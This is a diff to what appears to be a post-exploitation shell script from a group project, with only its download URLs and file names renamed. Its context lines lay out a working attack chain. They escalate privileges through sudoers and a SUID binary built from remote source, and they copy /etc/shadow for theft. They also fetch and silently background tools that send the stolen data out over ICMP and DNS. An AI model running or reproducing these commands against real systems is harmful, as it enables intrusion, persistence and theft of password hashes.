@@ -40,7 +40,7 @@ chmod +x sudoers_pe.sh
 # Build Binary
 mkdir /tmp/persistence
 cd /tmp/persistence
-curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/480551fc7c3a88738cb2a55c7be778fce30c94fc/Gp08_binarysuid.c > suid.c
+curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/480551fc7c3a88738cb2a55c7be778fce30c94fc/binarysuid.c > suid.c
 gcc suid.c -o suid
 
 # Run Exploit
@@ -83,11 +83,11 @@ cat /etc/shadow > /tmp/exfiltrate/shadow
 # Run qssender to exfilrate via ICMP
 wget https://github.com/ariary/QueenSono/releases/latest/download/qssender -O /tmp/qssender
 chmod +x /tmp/qssender
-curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/480551fc7c3a88738cb2a55c7be778fce30c94fc/Gp08_run_qssender.sh > Gp08_run_qssender.sh
+curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/480551fc7c3a88738cb2a55c7be778fce30c94fc/run_qssender.sh > Gp08_run_qssender.sh
 chmod +x /tmp/Gp08_run_qssender.sh
 nohup /tmp/Gp08_run_qssender.sh &>/dev/null &
 # Run DNSteal to exfiltrate via DNS
-curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/480551fc7c3a88738cb2a55c7be778fce30c94fc/Gp08_run_dnsteal.sh > run_dnssteal.sh
+curl -L https://gist.github.com/donovancham/d1078240bdc8108e03de68d83594603e/raw/480551fc7c3a88738cb2a55c7be778fce30c94fc/run_dnsteal.sh > Gp08_run_dnsteal.sh
 chmod +x /tmp/Gp08_run_dnsteal.sh
 nohup /tmp/Gp08_run_dnsteal.sh &>/dev/null &
 
